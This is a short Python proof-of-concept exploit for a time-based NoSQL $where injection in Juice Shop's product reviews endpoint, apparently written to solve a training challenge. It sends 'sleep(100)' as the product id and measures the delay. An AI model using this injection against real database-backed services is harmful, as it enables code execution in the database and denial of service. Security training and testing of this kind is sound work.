"""NoSQL (server-side JS) injection in the $where clause of
routes/showProductReviews.ts.

The product id is concatenated into `$where: 'this.product == ' + id`, so a
JavaScript payload runs in the database engine (the noSqlCommandChallenge, as
in Juice Shop's own API test that injects `sleep(...)`). Time-based proof: a
blocking payload delays the response well beyond a benign id, which is only
possible if the injected code executes.
"""

import time
import urllib.request


def _timed(url: str) -> float:
    start = time.monotonic()
    with urllib.request.urlopen(url) as res:
        res.read()
    return time.monotonic() - start


def exploit(base: str) -> tuple[bool, str]:
    # $where runs the payload once per review document, so a small per-call
    # sleep already adds up to a clear, bounded delay.
    baseline = _timed(f"{base}/rest/products/1/reviews")
    injected = _timed(f"{base}/rest/products/sleep(100)/reviews")
    return injected - baseline > 1.0, f"{injected:.1f}s injected vs {baseline:.1f}s baseline"
